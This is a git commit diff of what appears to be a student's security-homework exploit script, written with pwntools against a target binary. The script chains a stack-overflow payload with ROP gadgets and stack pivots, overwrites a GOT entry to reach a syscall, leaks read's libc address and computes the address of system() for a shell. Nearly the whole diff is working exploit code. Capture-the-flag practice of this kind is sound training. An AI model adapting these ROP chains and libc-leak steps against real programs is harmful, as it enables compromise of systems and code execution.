427c7707302a2ab44ba855e35f281e93c204126a
YJC(openopentw) <openopentw@gmail.com>
2017-10-26 15:33:55 +0800

    can leak system_addr now

--- hw/hw3/10135_readme/1.py
+++ hw/hw3/10135_readme/1.py
@@ -18,6 +18,7 @@ payload = b'a'*0x20
 rbp_20_read_leave_ret = 0x000000000040062b
 buf1 = 0x00602000 - 0x200
 buf2 = buf1 + 0x100
+tmp_buf = buf1 - 0x30 + 0x20
 read_got = 0x4004c0
 read_plt = 0x601020
 pop_rsi_r15 = 0x00000000004006b1
@@ -25,28 +26,45 @@ pop_rdi = 0x00000000004006b3
 leave_ret = 0x0000000000400646
 pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa
 mov_rdx_r13_rsi_r14_edi_r15d_call_QWORD_r12_rbx_8 = 0x400690
-rax_execve = 0x3b
-rax_execve = 0x3
 
 rop = flat([buf1+0x20, rbp_20_read_leave_ret])
 r.recvuntil(':')
 r.send(payload + rop)
 
 # now rax=0, rdi=0x0, rsi=0x601048, rdx=0x40
-rop = flat([pop_rsi_r15, read_plt-rax_execve+1, '/bin/sh\0', read_got, buf1-0x30+0x20, rbp_20_read_leave_ret])
+rop = flat([pop_rsi_r15, read_plt, 0xdeadbeaf, read_got] + [tmp_buf, rbp_20_read_leave_ret])
 r.send(rop)
 
-rop = flat([0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, buf1+0x20+0x20, rbp_20_read_leave_ret])
+rop = flat([0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa] + [buf1+0x20+0x20, rbp_20_read_leave_ret])
 r.send(rop)
 
-rop = flat([leave_ret, 0xdeadbeaf, 0xdeadbeaf, 0xdeadbeaf, buf1-0x8, rbp_20_read_leave_ret])
+# now rax=1, read_got = syscall
+rop = flat([pop_rdi, 0x1, pop_rsi_r15, read_plt] + [tmp_buf, rbp_20_read_leave_ret])
 r.send(rop)
 
-r.send(p64(read_got))
-# r.sendline(b'')
+rop = flat([0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa, 0xaaaaaaaa] + [buf1+0x40+0x20, rbp_20_read_leave_ret])
+r.send(rop)
+
+rop = flat([0xdeadbeaf, read_got, leave_ret, 0xdeadbeaf, buf1-0x8, rbp_20_read_leave_ret])
+r.send(rop)
+
+# r.send(p64(read_got))
+r.sendline(b'')
 
 input('Press enter to continue.')
 
-r.send(b'\x2e' * (rax_execve-1) + b'\x2e')
+# answer read_plt
+r.send(b'\x2e')
+
+# get written result
+read_addr = u64(r.recvn(0x30)[:8]) - 0xe
+print('read_addr = ', hex(read_addr))
+
+read_off = 0x00000000000f7220
+system_off = 0x0000000000045390
+libc_addr = read_addr - read_off
+system_addr = libc_addr + system_off
+
+print('system_addr = ', hex(system_addr))
 
 r.interactive()
